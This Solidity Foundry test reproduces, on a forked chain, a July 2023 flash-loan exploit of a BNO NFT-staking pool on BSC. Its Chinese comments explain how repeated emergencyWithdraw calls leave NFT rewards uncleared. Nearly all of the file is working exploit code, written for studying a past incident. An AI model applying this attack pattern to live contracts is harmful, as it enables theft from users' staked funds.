// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~$505K
// Time : 2023-07-18
// Attacker : https://bscscan.com/address/0xa6566574edc60d7b2adbacedb71d5142cf2677fb
// Attacker Contract : https://bscscan.com/address/0xd138b9a58d3e5f4be1cd5ec90b66310e241c13cd
// Vulnerable Contract : https://bscscan.com/address/0xdca503449899d5649d32175a255a8835a03e4006
// Attack Tx : https://bscscan.com/tx/0x33fed54de490797b99b2fc7a159e43af57e9e6bdefc2c2d052dc814cfe0096b9

// @Phalcon View : https://explorer.phalcon.xyz/tx/bsc/0x33fed54de490797b99b2fc7a159e43af57e9e6bdefc2c2d052dc814cfe0096b9
// @Analysis
// https://twitter.com/BeosinAlert/status/1681116206663876610
// https://www.jinse.cn/news/blockchain/3650688.html

// Root Cause : Project Contract Logic Flaw

interface IPool {
    function emergencyWithdraw() external;

    function stakeNft(uint256[] memory tokenIds) external payable;

    function unstakeNft(uint256[] memory tokenIds) external payable;

    function pledge(uint256 _stakeAmount) external payable;
}

contract Attacker is Test {
    // 攻击过程中质押的NFT
    IERC721 NFT = IERC721(0x8EE0C2709a34E9FDa43f2bD5179FA4c112bEd89A);
    IERC20 BNO = IERC20(0xa4dBc813F7E1bf5827859e278594B1E0Ec1F710F);
    IPancakePair PancakePair = IPancakePair(0x4B9c234779A3332b74DBaFf57559EC5b4cB078BD);
    IPool Pool = IPool(0xdCA503449899d5649D32175a255A8835A03E4006);
    address private constant attacker = 0xA6566574eDC60D7B2AdbacEdB71D5142cf2677fB;
    address private constant attackerContract = 0xD138b9a58D3e5f4be1CD5eC90B66310e241C13CD;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 30056629);
        cheats.label(address(NFT), "NFT");
        cheats.label(address(BNO), "BNO");
        cheats.label(address(PancakePair), "PancakePair");
        cheats.label(address(Pool), "Pool");
        cheats.label(attacker, "Attacker");
        cheats.label(attackerContract, "Attacker Contract");
    }

    // 发起攻击
    function testEploit() public {
        // 攻击前准备:转移攻击过程中的两个NFT到测试的账户地址
        cheats.startPrank(attackerContract);
        NFT.transferFrom(attacker, address(this), 13);
        NFT.transferFrom(attacker, address(this), 14);
        cheats.stopPrank();

        // 记录攻击前Attacker的BNO余额
        emit log_named_decimal_uint(
            "Attacker balance of BNO before exploit", BNO.balanceOf(address(this)), BNO.decimals()
        );

        // 利用闪电贷借到BNO,数量是pancake能提供的最大数量了
        PancakePair.swap(0, BNO.balanceOf(address(PancakePair)) - 1, address(this), hex"00");

        // 记录攻击后Attacker的BNO余额
        emit log_named_decimal_uint(
            "Attacker balance of BNO after exploit", BNO.balanceOf(address(this)), BNO.decimals()
        );
        // Attacker最后还利用PancakePair.Swap()将得到的所有BNO换成了COW代币才结束的(可能是BNO这攻击完后烫手吧)
    }

    // 为测试账户地址实现onERC721Received()以接收NFT
    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // pancake闪电贷-回调函数
    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        BNO.approve(address(Pool), type(uint256).max);

        // BNO用NFT质押过程的逻辑问题就在其emergencyWithdraw()上
        // Attacker重复利用漏洞获取BNO奖励
        for (uint256 i = 0; i < 100; i++) {
            callEmergencyWithdraw();
        }
        // 归还BNO闪电贷,攻击over
        BNO.transfer(address(PancakePair), 296_077 * 1e18);
    }

    function callEmergencyWithdraw() internal {
        NFT.approve(address(Pool), 13);
        NFT.approve(address(Pool), 14);

        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 13;
        tokenIds[1] = 14;
        // 向BNO池质押两个NFT
        Pool.stakeNft{value: 0.008 ether}(tokenIds);
        // 再质押所有的BNO代币
        Pool.pledge{value: 0.008 ether}(BNO.balanceOf(address(this)));
        // !!!紧急提款,但由于逻辑漏洞,会提出质押的BNO代币,并清空质押的BNO代币数量和债务数量
        // !!!但是NFT的质押奖励没有清零(本来是应该质押了NFT并且之后再质押BNO,就会按照两者一定乘积比例得到质押奖励)
        Pool.emergencyWithdraw();
        // 这时再解质押NFT,拿回NFT的同时结算出多的BNO奖励
        Pool.unstakeNft{value: 0.008 ether}(tokenIds);
    }
}
